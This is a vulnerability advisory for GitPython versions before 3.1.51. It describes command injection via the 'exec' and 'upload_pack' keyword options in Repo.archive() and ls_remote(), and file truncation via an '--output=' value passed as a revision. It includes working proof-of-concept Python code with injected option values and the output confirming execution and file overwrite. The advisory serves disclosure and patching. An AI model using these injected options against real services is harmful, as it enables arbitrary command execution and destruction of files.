@@ -1,0 +1,103 @@
+PYSEC-2026-3839 PyPI/gitpython — GitPython: command injection via unguarded Git options in `Repo.archive()`, `git.ls_remote()`, and arbitrary file overwrite via `Repo.iter_commits()` / `Repo.blame()`
+package: gitpython
+ecosystem: PyPI
+versions affected:
+  >= 0, < 3.1.51 (ECOSYSTEM)
+aliases: CVE-2026-67323, GHSA-956x-8gvw-wg5v
+references:
+  https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-956x-8gvw-wg5v
+  https://nvd.nist.gov/vuln/detail/CVE-2026-67323
+  https://github.com/gitpython-developers/GitPython/pull/2163
+  https://github.com/gitpython-developers/GitPython/commit/701ce32fe5ba8cb622c0e0342a376a6beb47d738
+  https://github.com/gitpython-developers/GitPython
+  https://github.com/gitpython-developers/GitPython/releases/tag/3.1.51
+  https://www.vulncheck.com/advisories/gitpython-before-command-injection-via-unguarded-git-options
+  https://pypi.org/project/gitpython
+  https://github.com/advisories/GHSA-956x-8gvw-wg5v
+
+## Summary
+
+GitPython already know that --upload-pack / --exec are command-exec vectors, they are denylist in
+git/remote.py:535 and check by Git.check_unsafe_options() (git/cmd.py:963), the thing is this
+check him he is only call from fetch, pull, push and clone_from, everything else who build a git
+argv from caller values just go through, no check, three examples
+
+## Code analysis
+
+Repo.archive (git/repo/base.py:1623) do self.git.archive("--", treeish, *path, **kwargs), the
+treeish is after the --, but the kwargs get dashify by transform_kwarg (git/cmd.py:1487) and
+they land before it, so {"remote": ".", "exec": "<cmd>"} give
+git archive --remote=. --exec=<cmd> -- <rev>, the --remote spawn the upload-archive helper and
+--exec choose which binary that is, done, default git config, no protocol.ext.allow needed, and
+archive already document caller kwargs (format, prefix, path) so pass a dict is normal usage
+
+repo.git.ls_remote(url, upload_pack="<cmd>"), same builder, same result, it's exactly the kwarg
+gap that CVE-2026-42215 close for fetch/pull/push/clone_from, except the dynamic
+repo.git.<anything>(**user_dict) surface him he never got the fix
+
+Repo.iter_commits / Repo.blame (git/objects/commit.py:348, git/repo/base.py:1199) put the rev
+before the --, no leading-dash check, a "branch name" like --output=/etc/whatever become
+git rev-list --output=... --, and git he open and truncate that file before he even validate the
+revision, the file is gone even if the command error right after
+
+## PoC
+
+Released 3.1.50, git 2.51.0, stock config (`git config --get protocol.ext.allow` returns nothing here).
+
+```
+pip install GitPython   # 3.1.50
+```
+
+Common setup for the three:
+
+```python
+import io, os, tempfile, subprocess, git
+d = tempfile.mkdtemp()
+subprocess.run(['git','init','-q',d], check=True)
+subprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a',
+                'commit','-q','--allow-empty','-m','init'], check=True)
+repo = git.Repo(d)
+tmp = tempfile.gettempdir()
+```
+
+1. exec via archive (a service exports a repo and forwards the user's options dict):
+
+```python
+m = os.path.join(tmp, 'gp_archive_check')
+try: repo.archive(io.BytesIO(), **{'remote': '.', 'exec': 'touch ' + m})
+except git.exc.GitCommandError as e: print('[*]', str(e).splitlines()[0][:55])
+print('[+] marker present:', os.path.exists(m))
+```
+```
+[*] Cmd('git') failed due to: exit code(128)
+[+] marker present: True
+```
+
+2. exec via ls_remote:
+
+```python
+m = os.path.join(tmp, 'gp_lsremote_check')
+try: repo.git.ls_remote('.', upload_pack='touch ' + m + ';')
+except git.exc.GitCommandError as e: print('[*]', str(e).splitlines()[0][:55])
+print('[+] marker present:', os.path.exists(m))
+```
+```
+[*] Cmd('git') failed due to: exit code(128)
+[+] marker present: True
+```
+
+3. file clobber via a rev that looks like a ref:
+
+```python
+v = os.path.join(tmp, 'release_notes.txt')
+open(v,'w').write('do not delete\n')
+print('[*] before:', repr(open(v).read()))
+try: list(repo.iter_commits('--output=' + v))
+except git.exc.GitCommandError as e: print('[*]', str(e).splitlines()[0][:55])
+print('[+] after :', repr(open(v).read()), '<- truncated')
+```
+```
+[*] before: 'do not delete\n'
+[*] Cmd('git') failed due to: exit code(129)
+[+] after : '' <- truncated
+```
